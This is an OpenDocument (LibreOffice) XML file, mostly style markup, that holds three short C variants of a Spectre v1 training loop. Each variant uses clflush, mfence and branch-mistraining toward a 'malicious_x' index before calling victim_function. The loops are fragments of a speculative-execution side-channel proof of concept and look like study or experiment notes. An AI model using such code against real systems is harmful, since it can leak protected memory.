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e952" officeooo:paragraph-rsid="001fa074"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in"/>
      <style:text-properties fo:color="#d4d4d4" fo:background-color="#1e1e1e"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" fo:font-size="24pt" fo:font-weight="bold" officeooo:rsid="00244dce" officeooo:paragraph-rsid="00244dce" fo:background-color="transparent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Droid Sans Fallback" officeooo:rsid="001de952" officeooo:paragraph-rsid="001fa074"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Droid Sans Fallback" fo:font-size="24pt" fo:font-weight="bold" officeooo:rsid="00244dce" officeooo:paragraph-rsid="00244dce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roid Sans Fallback" fo:font-size="24pt" fo:font-weight="bold" officeooo:rsid="00278ef6" officeooo:paragraph-rsid="00278ef6" style:font-size-asian="24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Droid Sans Mono"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002062d8"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00229e79"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00286ed6"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" officeooo:rsid="0029eeca"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002062d8"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00229e79"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00286ed6"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#569cd6" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#c586c0" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#b5cea8" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#dcdcaa" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#6a9955" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#ce9178" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#d7ba7d" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="001fa07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9ee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2">W</text:span>1</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">size_t training_x = tries % bufferSize;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">int x;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">f</text:span><text:span text:style-name="T9">or (int j = 29; j &gt;= 0; j--) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>clflush(&amp;bufferSize);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>asm volatile("mfence\n");</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = ((j % 6) - 1) &amp; ~0xFFFF;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = (x | (x &gt;&gt; 16));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = training_x ^ (x &amp; (malicious_x ^ training_x));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>asm volatile("mfence\n");</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>victim_function(x);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">}</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T22">W</text:span>2</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">size_t training_x = tries % bufferSize;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">int x;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">f</text:span><text:span text:style-name="T9">or (int j = 29; j &gt;= 0; j--) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>clflush(&amp;bufferSize);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>clflush_array(bigNumberBuffer);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>for (volatile int z = 0; z &lt; 100; z++) {}</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = ((j % 6) - 1) &amp; ~0xFFFF;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = (x | (x &gt;&gt; 16));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = training_x ^ (x &amp; (malicious_x ^ training_x));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>victim_function(x);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">}</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T22">W</text:span>3</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9">for (int j = 29; j &gt;= 0; j--) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>clflush(&amp;bufferSize);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>clflush_array(bigNumberBuffer); <text:s/>// </text:span><text:span text:style-name="T12">clflush array has mfence</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = ((j % 6) - 1) &amp; ~0xFFFF;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = (x | (x &gt;&gt; 16));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>x = training_x ^ (x &amp; (malicious_x ^ training_x));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>asm volatile("mfence\n");</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"><text:tab/>victim_function(x);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9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3:55:38.713653625</meta:creation-date>
    <dc:date>2019-10-15T14:33:34.256404250</dc:date>
    <meta:editing-duration>PT37M52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60" meta:character-count="834" meta:non-whitespace-character-count="689"/>
  </office:meta>
</office:document-meta>
</file>